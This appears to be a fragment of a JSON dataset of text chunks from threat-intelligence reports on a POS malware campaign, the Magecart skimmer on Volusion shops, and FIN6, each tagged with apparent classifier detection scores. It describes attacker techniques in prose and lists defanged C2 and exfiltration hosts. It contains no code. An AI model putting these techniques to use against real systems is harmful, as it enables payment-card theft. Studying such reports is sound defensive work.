+        "text": "The pattern of the C2 download request destination is generally URL:PORT/[a-zA-Z0-9]{4}.\n It executes InternetConnectA, InternetOpenA, HttpOpenRequestA, HttpSendRequestA for the purpose of downloading the next stage.\n Morphisec observed 2 types of beacons during this campaign, the first one is a regular direct reflective loaded Cobalt Strike DLL beacon, usually XOR encoded.\n The second type is a shellcode backdoor beacon with PowerShell and Mimikatz functionality.\n",
+        "source": "New Global Cyber Attack on Point of Sale Systems.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.37159669399261475
+        },
+        "prediction": {}
+    },
+    {
+        "text": "In some cases, after executing the backdoors, the attackers install \u201cWindowsHelpAssistant\u201d task in the task scheduler. In turn, this, on login, uses rundll32.exe with System privileges to execute and export function \u201cworkerInstance\u201d from a downloaded binary DLL \u201cAssistant32.dll\u201d.",
+        "source": "New Global Cyber Attack on Point of Sale Systems.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5930192470550537
+        },
+        "prediction": {}
+    },
+    {
+        "text": "We also observed similar command execution as part of the HKLM Run key.\n The \u201cAssistant32.dll\u201d is the FrameworkPOS scraper that shares similar TTPs to a previously seen FrameworkPOS used by FIN6.\n",
+        "source": "New Global Cyber Attack on Point of Sale Systems.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6302551627159119
+        },
+        "prediction": {}
+    },
+    {
+        "text": "These types of advanced attacks that utilize memory to evade detection solutions either by reflectively loading libraries, hollowing process memory or injecting code into new processes, are harder and harder to attribute due to the simple fact that more and more criminals are taking advantage of the strength of these evasion techniques and the weakness of runtime detection technologies to cope with such evasion. The attackers have the advantage of choosing where to execute their malicious code and when to execute it, while runtime detection solutions cannot constantly scan the memory to detect the attack precisely when it manifests without significantly impacting the performance of the process runtime.\n It is important to note that Morphisec prevents these types of attacks immediately, without any prior knowledge of the attack form or techniques.",
+        "source": "New Global Cyber Attack on Point of Sale Systems.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.4714444875717163
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The forensic information used in this analysis was captured after the attack was already prevented.\n",
+        "source": "New Global Cyber Attack on Point of Sale Systems.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.7785429358482361
+        },
+        "prediction": {}
+    },
+    {
+        "text": "hxxp://5.39.219[.]15:8081/JVZb\nhxxp://45.247.22[.]27:4444/EzFB\nhxxp://standardcertifications[.]com:8080/cArF\nhxxp://34.245.88[.]113:9090/tNDV\nhxxp://2.72.0[.]200/9RyX\nhxxp://185.202.174[.]91:443 \nhxxp://192.81.223[.]204/rr3E\nhxxp://172.16.196[.]200/JSlT\nStay in the loop with industry insight, cyber security trends, and cyber attack information and company updates.\n",
+        "source": "New Global Cyber Attack on Point of Sale Systems.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.23903539776802063
+        },
+        "prediction": {}
+    },
+    {
+        "text": "We discovered that the online credit card skimming attack known as Magecart or E-Skimming was actively operating on 3,126 online shops.\n",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5822493433952332
+        },
+        "prediction": {}
+    },
+    {
+        "text": "By: Joseph C Chen\nOctober 10, 2019\n Read time: 6 min (1565 words)\nUpdated on October 14, 2019 at 2:50 AM PST to add a statement from Volusion.\n",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.48548007011413574
+        },
+        "prediction": {}
+    },
+    {
+        "text": "We discovered that the online credit card skimming attack known as Magecart or E-Skimming was actively operating on 3,126 online shops.",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5822493433952332
+        },
+        "prediction": {}
+    },
+    {
+        "text": "All of the impacted online shops are hosted on the cloud platform of the e-commerce service provider \u201cVolusion,\u201d one of the top e-commerce platforms in the market. This is actually the third time we have identified a card skimmer injected into the cloud platform of an e-commerce provider. Two other businesses were already victimized this year: a campus e-commerce platform and a hotel e-commerce platform.",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5574473142623901
+        },
+        "prediction": {}
+    },
+    {
+        "text": "These targets are obviously appealing to cybercriminals since they are connected to multiple \u2014 in this most recent case, thousands of \u2014 online shops.\n",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.4928329885005951
+        },
+        "prediction": {}
+    },
+    {
+        "text": "We found malicious code injected into a JavaScript library provided by Volusion to their client shops. The injected code loaded another JavaScript stored on a Google Storage service. The loaded script is almost a direct copy of a normal JavaScript library but has a credit card skimmer carefully integrated. When customers submit their payment information, the skimmer will copy and send the personal information and credit card details to an exfiltration server belonging to the attackers.\n",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5782156586647034
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Country distribution of online shop users who accessed the card skimmer (based on data from the Trend Micro\u2122 Smart Protection Network\u2122 infrastructure)\n",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.745499849319458
+        },
+        "prediction": {}
+    },
+    {
+        "text": "During our investigation, we found that the attackers seemed more experienced and thoughtful than many other skimmer groups.",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6903215646743774
+        },
+        "prediction": {}
+    },
+    {
+        "text": "They did not simply add their malicious code at the top or end of a script; instead, they carefully integrated the code into the original script to be part of the execution flow of the program. The code was also written as simply as possible, making it difficult to be identified in a big library.",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6683139204978943
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Furthermore, they registered the domain of their exfiltration server in a similar style to a legitimate Volusion domain.\n Considering the modus operandi, we believe the attackers are from Magecart Group 6, which has also been identified as the notorious threat actor FIN6. We found similarities in the code used in this attack and the code used in FIN6\u2019s previous attacks on British Airways and Newegg.\n The attackers injected their code into a library provided on Volusion\u2019s e-commerce platform for their client shops. The script, described by the comments on the library, includes the necessary code for the pop-out feature of the shop\u2019s navigation menu.",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.47436681389808655
+        },
+        "prediction": {}
+    },
+    {
+        "text": "It was also used on the shop checkout page. The script is located at:\nThe attackers didn\u2019t just inject their code inside the library. They also integrated their code into the original function of jQueryUI code to be executed with the original execution flow. They created a new object \u201ce.widget.unbridge\u201d right before the original object \u201ce.widget.bridge\u201d and the malicious code is inside the new object. It\u2019s worth noting that the attackers even wrote their malicious code in a similar coding style to make it look more like a part of the original source code.\n The injected object will create a new script element to load another remote script stored on Google Storage.\n",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5633875131607056
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Figure 3. Malicious script injected into Volusion\u2019s JavaScript library\nFigure 4. Comparison of the original Volusion script (left) and the script with injection (right); the injected malicious code is highlighted\nAnalysis of the credit card skimmer\nThe loaded remote script is on Google Storage: \n Much of the code inside the script is from the library \u201cjs-cookie\u201d version 2.2.1.",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.569180428981781
+        },
+        "prediction": {}
+    },
+    {
+        "text": "However, the attackers modified it and integrated a credit card skimmer into the original script. The skimmer binds at the events \u201cmousedown\u201d and \u201ctouchstart\u201d of the payment submit button.\n",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6831640005111694
+        },
+        "prediction": {}
+    },
+    {
+        "text": "This means that when victims click (from desktop) or touch (from mobile devices) the submit button, the events will be triggered and the skimmer will be executed.\n",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.65267014503479
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Comparison of the JavaScript library injected with the skimmer (left) and the original \u201cjs-cookie\u201d library (right)\n",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.7249802350997925
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The skimmer copies the information on the entire payment form: the victim\u2019s name, address, phone number, email address, and credit card details (the number, cardholder name, expiration month, expiration year, and CVV number).\n",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6273012161254883
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Once the skimmer has the credit card details, it serializes the copied data into a string and encodes it with Base64. Then, it performs a character permutation on the encoded string to make sure it can\u2019t be directly decoded with Base64 decoding.\n",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6658074855804443
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The data will then be stored in sessionStorage with the key \u201c__utmz_opt_in_out\u201d. The next time the skimmer is loaded (usually on the page after the payment), it will detect if there is data inside sessionStorage and it will use HTTP POST to send the stolen payment information to a remote server at \u201chxxps[:]//volusion-cdn[.]com/analytics/beacon\u201d for exfiltration.\nFigure 6. Main script of the credit card skimmer\nNote that the attackers used the domain \u201cvolusion-cdn[.]com\u201d for their exfiltration server, a similar name to Volusion\u2019s legitimate server. A possible reason why the attackers stored the skimmer on Google Storage is because Volusion is also running its service on the Google Cloud Platform.\n As previously mentioned, based on the modus operandi, we believe the attackers are from Magecart Group 6, also known as the threat actor FIN6.",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.33200299739837646
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Here are the connections we considered:\nIt\u2019s also interesting to see that the skimmer in this attack binds to event \u201cmousedown\u201d and event \u201ctouchstart\u201d of the payment submit button. The previous Group 6 skimmer binds to event \u201cmouseup\u201d and event \u201ctouchend\u201d.\n",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6878852844238281
+        },
+        "prediction": {}
+    },
+    {
+        "text": "These events are different, but they are the pairs of each other that trigger the skimmer at almost the same time. It seems that they want to trigger the skimmer at the same moment, but the current version binds on two opposite events of the pairs to avoid detection from heuristic rules.\n It seems that Magecart is continuing to change and experiment with new attack methods, refining its skimmer to evade detection. Sophisticated groups such as these will always try to find new ways to stay undetected in their victims\u2019 systems.\n",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.4909358620643616
+        },
+        "prediction": {}
+    },
+    {
+        "text": "To defend against this type of threat, website owners should regularly check and strengthen their security with patches and server segregation. Site owners should also employ robust authentication mechanisms, especially for those that store and manage sensitive data. IT and security teams should restrict or disable outdated components and habitually monitor websites and applications for any indicators of suspicious activity that could lead to data exfiltration, execution of unknown scripts, or unauthorized access and modification.\n The following Trend Micro solutions, powered by XGen\u2122 security, protect users and businesses by blocking the scripts and preventing access to the malicious domains:\nResearcher Marcel Afrahim also published a Medium post on this case.\n A Volusion spokesperson has added the following statement:\n\"Volusion was alerted of a data security incident and can confirm that it was resolved within a few hours of notification.",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.1678854376077652
+        },
+        "prediction": {}
+    },
+    {
+        "text": "We are coordinating with authorities on this matter, and continue to enhance our systems that detect and prevent unauthorized access to user accounts.\n",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.513461172580719
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Volusion has taken action to help secure accounts, and we are continuing to monitor this matter in order to assure the security of our merchants.\"\n",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6227623224258423
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Try our services free for 30 days\nPrivacy | Legal | Accessibility | Site map\nCopyright \u00a92023 Trend Micro Incorporated.",
+        "source": "Magecart Card Skimmers Injected Into Online Shops.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5298963189125061
+        },
+        "prediction": {}
+    },
+    {
+        "text": "F I R E E Y E   T H R E A T   I N T E L L I G E N C E\nDISSECTING THE OPERATIONS  \nOF THE CYBER CRIME GROUP FIN6\nS P E C I A L R E P",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6691767573356628
+        },
+        "prediction": {}
+    },
+    {
+        "text": "A P R I L 2 0 1 6\nFollow the Money: Dissecting the Operations of the Cyber Crime Group FIN6 \nGaining Access - Indiscriminate or Intentional? \n  FIN6 - Getting the Job Done \nUnderground Card Shops -  Following the Money \nSPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 \nD",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6101099848747253
+        },
+        "prediction": {}
+    },
+    {
+        "text": "I S S E C TI N G T H E O P E R ATI O N S     O F T H E  C Y B E R C R I M E G R O U P F I N 6\nReports on payment card intrusions and theft are often fragmentary. \n ",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.44538867473602295
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The focus is on various pieces of the attack and less about capturing \nthe end-to-end cycle of compromise, data theft, illicit sale and use. \n ",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6348361968994141
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The full scope of attacker activity traditionally occurs beyond the \nview of any one group of investigators.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.729255735874176
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Incident response teams may \nhave visibility into the technical aspects of the breach itself, while \ncyber crime researchers monitor the movement and sale of stolen \nFireEye Threat Intelligence and iSIGHT Partners recently combined \nour research to illuminate the activities of one particular threat group: \nFIN6. This combined insight has provided unique and extensive \nvisibility into FIN6\u2019s operations, from initial intrusion to the methods \nused to navigate the victims\u2019 networks to the sale of the stolen \npayment card data in an underground marketplace.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6076326370239258
+        },
+        "prediction": {}
+    },
+    {
+        "text": "In this report, \nwe describe FIN6\u2019s activities and tactics, techniques and procedures \n(TTPs), and provide a glimpse into the criminal ecosystem that \nsupports the \u201cpayoff\u201d for their operations. \n",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6508967876434326
+        },
+        "prediction": {}
+    },
+    {
+        "text": "SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 \nFIN6 is a cyber criminal group intent on stealing payment card data \nfor monetization. In 2015, FireEye Threat Intelligence supported several \nMandiant Consulting investigations in the hospitality and retail sectors \nwhere FIN6 actors had aggressively targeted and compromised point-\nof-sale (POS) systems, making off with millions of payment card \nnumbers. Through iSIGHT, we learned that the payment card numbers \nstolen by FIN6 were sold on a \u201ccard shop\u201d  \u2014 an underground criminal \nmarketplace used to sell or exchange payment card data.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.36459484696388245
+        },
+        "prediction": {}
+    },
+    {
+        "text": "FIREEYE INTELLIGENCE TRACKS \ntargeted Financial threats (known as \n\u201cFIN\u201d groups) capable of using a wide \nrange of tools and tactics during their \ncomputer network intrusions. These \ngroups employ a high level of planning, \norganization and task management \nto accomplish their goals. The threat \nactors generally target a particular \ndemographic or type of organization, \nand their goal is financial gain from the \ndata they steal. They may profit through \ndirect sale of stolen data (such as \npayment cards or personally identifiable \ninformation), unauthorized transfer of \nfunds (such as with stolen bank account \nor bank routing credentials); or insider \ntrading (based on the theft of non-\npublic business information).\n",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.3119782507419586
+        },
+        "prediction": {}
+    },
+    {
+        "text": "P O S \nM A LWA R E\nExfiltration payment card data to \nthe cyber criminal underground\nG R A B N E W \nM A LWA R E\nC A R D   \nS H O P\nI N D",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6937410235404968
+        },
+        "prediction": {}
+    },
+    {
+        "text": "I S C R I M I N AT E\nTA R G E T E D\nC A S H O U T\nSPECIAL REPORT / FOLLOW THE MONEY:",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.7007463574409485
+        },
+        "prediction": {}
+    },
+    {
+        "text": "DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 \nGRABNEW, ALSO KNOWN AS NEVERQUEST AND VAWTRAK,  \nemerged around 2013 and since then has been consistently and \nindiscriminately spread through massive spam campaigns.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5952690839767456
+        },
+        "prediction": {}
+    },
+    {
+        "text": "We \ntypically differentiate between threat actors who indiscriminately \ndistribute malware and threat actors who use malware selectively. \n",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5380791425704956
+        },
+        "prediction": {}
+    },
+    {
+        "text": "GRABNEW itself is a credential-stealing backdoor with form-grabbing \ncapabilities and the ability to inject code into specific web pages to, \nfor example, mimic a valid login prompt for a financial institution to \nfacilitate banking fraud. In some cases, the presence of GRABNEW \nmalware has overlapped with the spread of POS malware such as \nPoSeidon, a variant of the Backoff POS malware. \n",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5550696849822998
+        },
+        "prediction": {}
+    },
+    {
+        "text": "In Mandiant\u2019s investigations, FIN6 already \npossessed valid credentials to each victim network \nand used those credentials to initiate further intrusion \nactivity.1",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5225366950035095
+        },
+        "prediction": {}
+    },
+    {
+        "text": "In one case, GRABNEW malware was found on a \nvictim computer that FIN6 later used in its operations. We \nsuspect that the computer was originally compromised with \nGRABNEW by a separate threat actor, who used GRABNEW \nto capture valid user credentials.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6047403812408447
+        },
+        "prediction": {}
+    },
+    {
+        "text": "FIN6 may have obtained \nthose credentials (through purchase or trade) and used them \nfor its operations.\n FIN6\u2019s use of GRABNEW, or credentials collected by \nGRABNEW, is not altogether surprising and possibly \npoints to a cyber crime support ecosystem that opens \ndoors to threat actors capable of lateral movement \nand more damaging activities. Previously, we observed \nanother FIN group \u2014 FIN2 \u2014 leverage several existing \nCitadel compromises to deploy their custom tools \nand expand within a network to compromise payment \ncard systems. Likewise, Proofpoint recently observed \nGRABNEW variants leading to downloads of POS \nmalware known as AbaddonPOS.\n",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.25264838337898254
+        },
+        "prediction": {}
+    },
+    {
+        "text": "When investigating an intrusion, it may be challenging to determine the initial method of compromise \u2014 the means through which a threat group \nfirst gained access to a victim network. While in some cases evidence may point to a spear-phishing attack or exploit execution, in other cases little \nto no forensic evidence of the original compromise remains.\n",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6597080230712891
+        },
+        "prediction": {}
+    },
+    {
+        "text": "SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 \nAfter locating POS systems within the \ntarget\u2019s environment, FIN6 deployed \nPOS malware that we call TRINITY.\n ",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6692284941673279
+        },
+        "prediction": {}
+    },
+    {
+        "text": "FIN6 \nAll threat groups generally follow a broad \noperational framework known as the \nAttack Lifecycle.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.7471408247947693
+        },
+        "prediction": {}
+    },
+    {
+        "text": "While the phases of \nthe Attack Lifecycle \u2014 from initial compromise \nto privilege escalation to maintaining presence \nand completing the mission \u2014 are remarkably \nconsistent, the specific TTPs used vary widely \nbased on a group\u2019s skills, motivations and \nultimate goals.\n  After gaining access with valid credentials, \nwe observed FIN6 leveraging components of \nthe Metasploit Framework to establish their \nfoothoold.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5790930390357971
+        },
+        "prediction": {}
+    },
+    {
+        "text": "For example, in one case, FIN6 used \na Metasploit PowerShell module to download \nand execute shellcode and to set up a local \nlistener that would execute shellcode received \nover a specific port.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.61586594581604
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Similarly, FIN6 used at \nleast two downloaders called HARDTACK and \nSHIPBREAD (apparent variations on Metasploit \npayloads) to establish backdoor access to the \ncompromised environment.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.590367317199707
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Both of these tools \nare configured to connect to remote command \nand control (CnC) servers and download and \nexecute shellcode.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5076166391372681
+        },
+        "prediction": {}
+    },
+    {
+        "text": "FIN6 generally used either \nregistry run keys or Windows scheduled tasks \nin order to establish persistence for these tools.\n ",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5633887052536011
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Once their accesses were established with \npreferred backdoors, FIN6 used additional \npublic utilities such as Windows Credentials \nEditor for privilege escalation and credential \nharvesting. Additional privilege escalation \ntools exploited Microsoft Windows \nvulnerabilities in an attempt to compromise \nprivileged account credentials on various \nhosts.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.499920517206192
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The tools targeted CVE-2013-3660, \nCVE-2011-2005  and CVE-2010-4398, all \nof which could allow local users to access \nkernel-level privileges.2 Continuing their use \nof Metasploit-related tools, FIN6 also used \nMetasploit\u2019s PsExec NTDSGRAB module \nto obtain a copy of the Active Directory \ndatabase (ntds.dit).",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.4501945674419403
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Access to this file would \nallow them to extract password hashes from \nthe file and crack them offline.\n",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6653962135314941
+        },
+        "prediction": {}
+    },
+    {
+        "text": "These vulnerabilities have all been patched by Microsoft; Windows systems with up-to-date software and security \nSPECIAL REPORT / FOLLOW THE MONEY:",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5714501738548279
+        },
+        "prediction": {}
+    },
+    {
+        "text": "DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 \n In addition to collecting credentials, FIN6 \nused publicly available tools to map the \ninternal network and conduct reconnaissance \nagainst Active Directory, Structured Query \nLanguage (SQL) servers and NetBIOS. In \nparticular, during the reconnaissance phase \nthey gathered information on systems running \nSQL instances, dumping schemas for multiple \ndatabases and SQL user accounts. Specific \ntools used by FIN6 included Microsoft\u2019s \nbuilt-in SQL querying tool (osql.exe), Query \nExpress (a free, portable graphical SQL \nclient capable of connecting to Microsoft \nSQL and Oracle databases) and AdFind, a \nfree command-line tool for querying Active \nDirectory.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.4119296371936798
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Over the course of one day, for \nexample, the group targeted more than \n900 SQL servers to dump reconnaissance \ninformation to support further operations. \n ",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6638513207435608
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Capitalizing on the acquired reconnaissance \ndata, FIN6 began lateral movement using \ncredentials stolen from various systems on \nwhich they gathered usernames and password \nhashes. They likely cracked these hashes \noutside of the target\u2019s network before using \nmultiple sets of domain admin credentials in \ncombination with remote command execution \ntools such as PsExec and Remote Command \nExecutor (RemCom) throughout the rest of \nthe lateral movement phase.\n  To maintain presence and support interactive \naccess in the environment, FIN6 leveraged the \npublicly available Plink command-line utility \n(part of the PuTTY SSH and Telnet suite) to \ncreate SSH tunnels to CnC servers under their \ncontrol. As shown in Figure 2, they used these \nSSH tunnels to route Remote Desktop Protocol \n(RDP) traffic and allow for interactive RDP \nsessions with systems in the target network.\n  After locating POS systems within the \ntarget\u2019s environment, FIN6 deployed POS \nmalware that we call TRINITY (also known \nas FrameworkPOS), with Scheduled Tasks \nbeing used for persistence.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.34823453426361084
+        },
+        "prediction": {}
+    },
+    {
+        "text": "TRINITY runs \ncontinuously and targets system processes not \nlisted in its accompanying process blacklist, \nseeking data that matches payment card \ntrack data.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.4647136330604553
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Once the malware identifies track \ndata, it copies and encodes it to a local file in \na subdirectory of the c:\\windows\\ directory \nwhile attempting to conceal these files with \n.dll or .chm extensions.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6256334185600281
+        },
+        "prediction": {}
+    },
+    {
+        "text": "In one particular \ncase \u2014 and as an example of scale \u2014 FIN6 \ncompromised and deployed TRINITY on \naround 2,000 systems, resulting in millions  \nof exposed cards.\n",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5055790543556213
+        },
+        "prediction": {}
+    },
+    {
+        "text": "TRINITY IS POS MALWARE THAT ATTEMPTS TO LOCATE  \nAND STEAL PAYMENT CARD DATA FROM MEMORY.  \n",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5159813761711121
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The malware first creates mutexes named m_number3 and \nMuTex-Check and exits if either already exists. The malware \nthen continuously iterates over the current process listing and \nexamines the memory space of each process.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6499287486076355
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Processes with \nmodule names less than five characters are skipped, along \nwith some specific process names that are unlikely to contain \npayment card information.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5215693116188049
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The \nmalware encodes the data with a simple substitution cipher \nand single-byte XOR using the OxAA key. \n  Finally, to move the stolen payment card \ndata out of the environment, FIN6 used a \nscript to systematically iterate through a list \nof compromised POS systems, copying the \nharvested track data files to a numbered \n\u201clog\u201d file before removing the original data \nfiles. They then compressed the log files into \na ZIP archive and moved the archive through \nthe environment to an intermediary system \nand then to a staging system.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5644891858100891
+        },
+        "prediction": {}
+    },
+    {
+        "text": "From the \nstaging system, they then copied the stolen \ndata to external CnC servers under their \ncontrol using the FTP command line utility. \n  In another case, FIN6 used an alternative \nextraction method to upload payment card \ndata to a public file sharing service.\n ",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6853235363960266
+        },
+        "prediction": {}
+    },
+    {
+        "text": "SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 \nF I G U R E  2 :   ",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.7386609315872192
+        },
+        "prediction": {}
+    },
+    {
+        "text": "N E T W O R K D I AG R A M  S H OW I N G F I N 6 P L I N K  S S H T U N N E L U S E D T O R O U T E R D P T R A F F I C T O V I C T I M C O M P U T E R S\n AT TAC K E R   \nC n C S E R V E R\nP L I N K \nT U N N E L\nR D P \nT U N N E L\nAT TAC K E R   \nC n C S E R V E R\nAT TAC K E R   \nC n C S E R V E R\nV",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.43693777918815613
+        },
+        "prediction": {}
+    },
+    {
+        "text": "I C T I M 1 \nH O S T\nV I C T I M  2\nV",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6937979459762573
+        },
+        "prediction": {}
+    },
+    {
+        "text": "DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 \nOur analysis of the data sold \nthrough this underground \nvendor indicates that FIN6\u2019s \ncompromises are highly \nprofitable to the actors involved, \npotentially resulting in extensive \nfraud losses.\n  intelligence, we discovered that the \nstolen payment card data from these \nintrusions were sold in an underground card \nshop.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6081840991973877
+        },
+        "prediction": {}
+    },
+    {
+        "text": "This particular shop is advertised on \nmultiple underground cyber crime forums and \nhas offered diverse criminals access to millions \nof stolen payment cards on a regular basis. \n  This closes the loop on the \u201clifecycle\u201d of cyber \ncriminal activity and exemplifies one of the \nfinal stages of cyber crime actors monetizing \ntheir stolen data.\n ",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
